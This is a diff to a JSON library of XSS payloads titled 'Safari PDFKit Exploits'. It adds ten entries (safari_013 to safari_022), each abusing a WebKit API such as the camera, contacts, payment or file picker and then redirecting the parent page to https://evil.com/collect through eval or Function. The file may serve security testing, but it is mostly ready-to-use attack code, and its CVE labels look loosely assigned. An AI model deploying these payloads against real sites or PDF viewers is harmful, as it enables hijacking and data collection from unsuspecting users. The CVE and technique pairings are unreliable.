@@ -3,7 +3,7 @@
     "browser": "safari",
     "name": "Safari PDFKit Exploits",
     "description": "Safari/PDFKit specific XSS payloads targeting WebKit, macOS integration, and Objective-C bridge abuse",
-    "total_payloads": 12,
+    "total_payloads": 22,
     "categories": [
       "dom_access",
       "file_system",
@@ -125,6 +125,106 @@
       "description": "Safari PDFKit CVE-2022-32792 XSS protection bypass exploit",
       "risk_level": "critical",
       "browser": "safari"
+    },
+    {
+      "id": "safari_013",
+      "category": "webkit_specific",
+      "browser": "safari",
+      "technique": "webkit_animation_worklet_2024",
+      "payload": "try{if('animationWorklet'in CSS){CSS.animationWorklet.addModule('data:application/javascript,registerAnimator(\\'myAnimator\\',class{animate(){Function(\\'parent.location=\"https://evil.com/collect\"\\')();}});');}else{throw new Error('Animation Worklet not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Safari WebKit Animation Worklet bypass using CSS worklet execution",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-32373"
+    },
+    {
+      "id": "safari_014",
+      "category": "webkit_specific",
+      "browser": "safari",
+      "technique": "webkit_image_capture_bypass_2024",
+      "payload": "try{if('ImageCapture'in window){navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{const track=stream.getVideoTracks()[0];const imageCapture=new ImageCapture(track);imageCapture.takePhoto().then(()=>Function('parent.location=\"https://evil.com/collect\"')());});}else{throw new Error('ImageCapture not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Safari WebKit ImageCapture bypass using camera access trigger",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-27932"
+    },
+    {
+      "id": "safari_015",
+      "category": "webkit_specific",
+      "browser": "safari",
+      "technique": "webkit_payment_request_bypass_2024",
+      "payload": "try{if('PaymentRequest'in window){const supportedInstruments=[{supportedMethods:'basic-card'}];const details={total:{label:'Total',amount:{currency:'USD',value:'1.00'}}};const request=new PaymentRequest(supportedInstruments,details);request.show().then(()=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
+      "description": "Safari WebKit Payment Request bypass using payment API trigger",
+      "risk_level": "low",
+      "cve_reference": "CVE-2023-32409"
+    },
+    {
+      "id": "safari_016",
+      "category": "webkit_specific",
+      "browser": "safari",
+      "technique": "webkit_contact_picker_bypass_2024",
+      "payload": "try{if('contacts'in navigator){navigator.contacts.select(['name','email']).then(contacts=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Contact Picker not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
+      "description": "Safari WebKit Contact Picker bypass using contacts API access",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-27932"
+    },
+    {
+      "id": "safari_017",
+      "category": "webkit_specific",
+      "browser": "safari",
+      "technique": "webkit_device_motion_bypass_2024",
+      "payload": "try{if('DeviceMotionEvent'in window){const handler=()=>{window.removeEventListener('devicemotion',handler);Function('parent.location=\"https://evil.com/collect\"')();};window.addEventListener('devicemotion',handler);setTimeout(()=>window.dispatchEvent(new DeviceMotionEvent('devicemotion')),100);}else{throw new Error('DeviceMotion not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Safari WebKit DeviceMotion bypass using sensor event trigger",
+      "risk_level": "low",
+      "cve_reference": "CVE-2023-32409"
+    },
+    {
+      "id": "safari_018",
+      "category": "webkit_specific",
+      "browser": "safari",
+      "technique": "webkit_screen_wake_lock_bypass_2024",
+      "payload": "try{if('wakeLock'in navigator){navigator.wakeLock.request('screen').then(wakeLock=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Wake Lock not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
+      "description": "Safari WebKit Screen Wake Lock bypass using power management API",
+      "risk_level": "low",
+      "cve_reference": "CVE-2023-32373"
+    },
+    {
+      "id": "safari_019",
+      "category": "webkit_specific",
+      "browser": "safari",
+      "technique": "webkit_web_locks_bypass_2024",
+      "payload": "try{if('locks'in navigator){navigator.locks.request('resource',()=>Function('parent.location=\"https://evil.com/collect\"')());}else{throw new Error('Web Locks not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Safari WebKit Web Locks bypass using resource locking API",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-27932"
+    },
+    {
+      "id": "safari_020",
+      "category": "webkit_specific",
+      "browser": "safari",
+      "technique": "webkit_background_sync_bypass_2024",
+      "payload": "try{if('serviceWorker'in navigator&&'sync'in window.ServiceWorkerRegistration.prototype){navigator.serviceWorker.register('data:application/javascript,self.addEventListener(\\'sync\\',()=>{});').then(reg=>reg.sync.register('background-sync').then(()=>Function('parent.location=\"https://evil.com/collect\"')()));}else{throw new Error('Background Sync not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
+      "description": "Safari WebKit Background Sync bypass using service worker sync",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-32373"
+    },
+    {
+      "id": "safari_021",
+      "category": "webkit_specific",
+      "browser": "safari",
+      "technique": "webkit_presentation_api_bypass_2024",
+      "payload": "try{if('presentation'in navigator){const request=new PresentationRequest(['https://example.com']);request.start().then(connection=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Presentation API not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
+      "description": "Safari WebKit Presentation API bypass using display casting trigger",
+      "risk_level": "low",
+      "cve_reference": "CVE-2023-32409"
+    },
+    {
+      "id": "safari_022",
+      "category": "webkit_specific",
+      "browser": "safari",
+      "technique": "webkit_file_system_access_bypass_2024",
+      "payload": "try{if('showOpenFilePicker'in window){window.showOpenFilePicker().then(fileHandles=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('File System Access not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
+      "description": "Safari WebKit File System Access bypass using file picker API",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-27932"
     }
   ]
 }
